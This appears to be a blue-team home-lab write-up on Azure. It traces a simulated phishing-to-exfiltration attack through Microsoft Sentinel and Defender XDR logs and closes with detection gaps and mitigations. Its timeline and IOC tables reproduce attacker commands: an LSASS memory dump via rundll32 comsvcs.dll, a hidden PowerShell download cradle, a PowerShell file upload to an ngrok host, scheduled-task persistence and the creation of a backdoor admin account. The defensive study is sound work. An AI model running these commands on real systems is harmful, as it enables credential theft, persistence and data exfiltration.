# 🔍 Phase 3: Log Collection & Data Ingestion – Azure SOC Operations Home Lab

> ⚠️ **Disclaimer**  
> This lab was performed in an isolated Azure-based enterprise simulation strictly for educational purposes. All techniques and telemetry are used to emulate realistic attack patterns for defensive research and blue team skill-building.

---

## 🧠 Overview

In **Phase 3**, we collect and correlate telemetry generated by the simulated attack from Phase 2. Using **Microsoft Defender XDR** and **Microsoft Sentinel**, we:

- Queried PowerShell events, task creation, LSASS access, and reverse shell behavior
- Built a full incident timeline using logs and screenshots
- Extracted indicators of compromise (IOCs)
- Validated which activities were detected vs. missed
- Prepared data to support custom detection rules and response playbooks

The goal of this phase is to evaluate how well Microsoft Sentinel and Defender captured the attack and identify visibility or alerting gaps.

---

## 🧾 Incident Summary Table

| Field                  | Value                                                                                   |
|------------------------|-----------------------------------------------------------------------------------------|
| **Incident Title**     | Hands-on keyboard attack was launched from a compromised account (attack disruption)   |
| **First Alert Time**   | 2025-06-26 4:56 PM UTC                                                                  |
| **Machines Involved**  | `wayne-client`                                                                          |
| **Affected Users**     | `Barbara.HR`                                                                            |
| **MITRE Techniques**   | T1566.002, T1204.002, T1059.001, T1003.001                                              |
| **Alert Types**        | Credential Access, Discovery, Execution, Initial Access, Lateral Movement, Persistence |
| **File Hashes**        | `revshell.ps1` SHA256: `98d7c0...`<br>`Resume.docm` SHA256: `cbc440...`                 |
| **IP Addresses**       | `3.136.65.236`, `99.157.17.206`                                                         |
| **Processes Used**     | `lsass.exe`, `powershell.exe`, `schtasks.exe`, `rundll32.exe`, `net.exe`, `cmd.exe`    |

---

## 📽️ Step-by-Step Timeline with Visual Evidence

### **Step 1 – Initial Access via Phishing (.docm)**
- The attacker sends a malicious Word document with embedded macro.
- Victim Barbara opens the file, which spawns a PowerShell session.

📸 *Victim opens the malicious .docm triggering initial execution*  
![Word doc macro triggers PowerShell](path/to/word-document-macro.png)

📸 *KQL query confirms WINWORD was the parent process for PowerShell*  
![KQL confirms DOCM spawn](path/to/KQL-DOCM-confirm.png)

---

### **Step 2 – Reverse Shell via PowerShell and NGROK**
- A hidden PowerShell session downloads and runs `revshell.ps1`, establishing C2.

📸 *PowerShell reverse shell initiated from victim machine*  
![KQL confirms reverse shell execution](path/to/KQL-revshell-confirmed.png)

📸 *The NGROK connection is established successfully for C2*  
![Confirmed NGROK callback](path/to/ngrok-connection-confirmed.png)

---

### **Step 3 – Attacker Establishes Persistence (Scheduled Task)**
- `schtasks.exe` used to set up a task running `revshell.ps1` on logon.

📸 *Attacker creates scheduled task with hidden PowerShell script*  
![Scheduled task created](path/to/schtasks-creation.png)

📸 *KQL confirms persistence method using schtasks.exe*  
![KQL confirms scheduled task creation](path/to/KQL-schtasks-query.png)

---

### **Step 4 – Admin Account Created (Local Privilege Escalation)**
- Attacker creates a new local admin user `Joker` to maintain access.

📸 *Attacker adds local admin user "Joker" using net.exe*  
![New admin user created](path/to/net-user-admin.png)

📸 *Confirmation that Joker has administrative privileges and persistence via task*  
![Scheduled task plus Joker user](path/to/joker-user-task-confirmed.png)

---

### **Step 5 – Credential Dump (LSASS via rundll32)**
- LSASS memory dumped to retrieve NTLM hashes for pass-the-hash attacks.

📸 *rundll32 is used to dump LSASS memory contents*  
![LSASS dump initiated](path/to/lsass-dump-rundll.png)

📸 *Dumped LSASS file visible on system*  
![Memory dump saved](path/to/lsass-dump-success.png)

📸 *KQL confirms rundll32 process targeting LSASS*  
![KQL confirms rundll32 activity](path/to/KQL-lsass.png)

---

### **Step 6 – Domain Discovery and Lateral Movement**
- Attacker enumerates domain users and pivots to `Lucious.R&D`'s machine.

📸 *Domain user enumeration from victim machine*  
![Domain discovery by attacker](path/to/domain-discovery.png)

📸 *Attacker moves laterally to Lucious R&D machine and accesses files*  
![Lucious R&D accessed](path/to/lucious-rdp.png)

---

### **Step 7 – Data Exfiltration (Unalerted)**
- Sensitive `.bmp` file containing Batmobile schematics is exfiltrated using PowerShell POST to NGROK.

📸 *Sensitive file located in Lucious's directory*  
![Sensitive file accessed](path/to/batmobile-located.png)

📸 *File exfiltrated over HTTP using PowerShell*  
![File exfiltrated via PowerShell](path/to/file-exfil-post.png)

📸 *No corresponding alert was generated for the exfiltration event*  
![No alert raised for exfil](path/to/missing-alert-evidence.png)

---

### **Step 8 – Incident Triggered in Microsoft Defender**
- Multiple alerts correlate into an incident seen in Defender XDR and Sentinel.

📸 *Microsoft Defender attack graph showing timeline and components*  
![Defender alert map](path/to/attack-map.png)

📸 *Full incident structure rendered in Microsoft Sentinel*  
![Sentinel incident tree](path/to/incident-tree.png)

---

## 📊 KQL Queries with Screenshots

📸 *PowerShell events filtered by Barbara’s account for lateral movement and execution*  
![KQL for PowerShell Execution](path/to/KQL-pwsh-barbara.png)

📸 *Scheduled task creation by attacker as persistence method*  
![KQL for Scheduled Task Creation](path/to/KQL-schtasks.png)

📸 *Local admin user "Joker" created and confirmed in logs*  
![KQL for Admin Account Creation](path/to/KQL-net-user.png)

📸 *PowerShell C2 beacon to NGROK endpoint identified in Sentinel*  
![KQL for Reverse Shell to NGROK](path/to/KQL-ngrok-traffic.png)

---

## 📄 IOC Table (CSV Consolidation)

| Indicator Type | Value                                       | Source              |
|----------------|---------------------------------------------|---------------------|
| IP Address     | 3.134.125.175                               | reverse shell (C2)  |
| File Name      | revshell.ps1                                | malicious payload   |
| SHA256 Hash    | 98d7c0e974e4e9f771ef346633c08ac0bf9a9d95a4.. | revshell.ps1        |
| File Name      | Wayne_Enterprises_Resume.docm               | phishing document   |
| SHA256 Hash    | cbc440c111184acc4848b1dade91b4ef118b94895.. | Resume.docm         |
| Process        | powershell.exe                              | post-exploitation   |
| Process        | rundll32.exe                                | LSASS dump          |
| URL            | `https://<ngrok>.ngrok-free.app/revshell.ps1` | C2 download path    |

---

## 📅 Sentinel Workbook Timeline Table

| TimeGenerated (UTC)     | DeviceName              | InitiatingProcessCommandLine                                                                                  |
|-------------------------|-------------------------|---------------------------------------------------------------------------------------------------------------|
| 6/27/2025, 6:26:43 PM   | wayne-client.wayne.corp | `WINWORD.EXE /n "C:\Users\Barbara.HR\Desktop\Wayne_Enterprises_Resume.docm" /o ""`                         |
| 6/27/2025, 6:28:31 PM   | wayne-client.wayne.corp | `powershell.exe -ep Bypass -w hidden -Command IEX(...)`                                                      |
| 6/28/2025, 9:46:43 AM   | wayne-client.wayne.corp | `rundll32.exe comsvcs.dll MiniDump 772 C:\Windows\Temp\lsass.dmp full`                                     |
| 6/28/2025, 11:06:10 AM  | wayne-client.wayne.corp | `powershell.exe cd "C:\Users\Lucious.R&D\Documents"`                                                     |
| 6/28/2025, 11:28:37 AM  | wayne-client.wayne.corp | `powershell.exe Invoke-WebRequest -Uri http://<ngrok>/upload -InFile batmobile.bmp`                          |
| 6/28/2025, 11:32:21 AM  | wayne-client.wayne.corp | `schtasks.exe /create /tn "Updater" /tr "powershell.exe -w hidden -File C:\Users\Public\revshell.ps1"`     |
| 6/28/2025, 11:33:54 AM  | wayne-client.wayne.corp | `net user Joker Pass123 /add && net localgroup administrators Joker /add`                                    |

📸 *Part of the Sentinel workbook beginning the timeline of events*  
[insrt ss here]

## 🧠 End Summary & Detection Gap

Phase 3 transformed the attack simulation into actionable security telemetry. Most key behaviors were logged and correlated by Microsoft Defender and Sentinel:

- ✅ PowerShell execution
- ✅ Persistence mechanisms
- ✅ Credential dumping
- ✅ RDP lateral movement

> ❌ **However, the final stage – exfiltration of `batmobile.bmp` – was not detected.**

This confirms a classic detection gap: **low-noise data exfiltration** can easily bypass traditional behavior-based detection.

### 🛡 Mitigation Plan:
- Implement **Data Loss Prevention (DLP)** policies on endpoints
- Flag file types (.bmp, .docx, .pdf) being POSTed externally
- Alert on PowerShell activity invoking file uploads or unknown HTTP hosts

### 💡 Looking Ahead:
These findings will inform our Phase 4 detection engineering. We'll build custom Sentinel queries and analytic rules to:
- Detect low-and-slow exfiltration
- Correlate scheduled task and new-user creation under suspicious chains
- Create automated response playbooks to isolate machines and revoke tokens

---

## ✅ Phase 3 Complete

Phase 3 closes the telemetry feedback loop. We've:
- Captured rich, correlated logs across Sentinel and Defender
- Identified a key blind spot
- Proposed realistic mitigations

**Next: Phase 4 – Detection Engineering & Automated Response 🛠**

---

> [🔗 Back to Phase 2 – Attack Simulation](https://github.com/bnmou/Azure-Enterprise-Simulation/blob/main/2%20-%20Attack%20Simulation%20%26%20Threat%20Emulation.md)
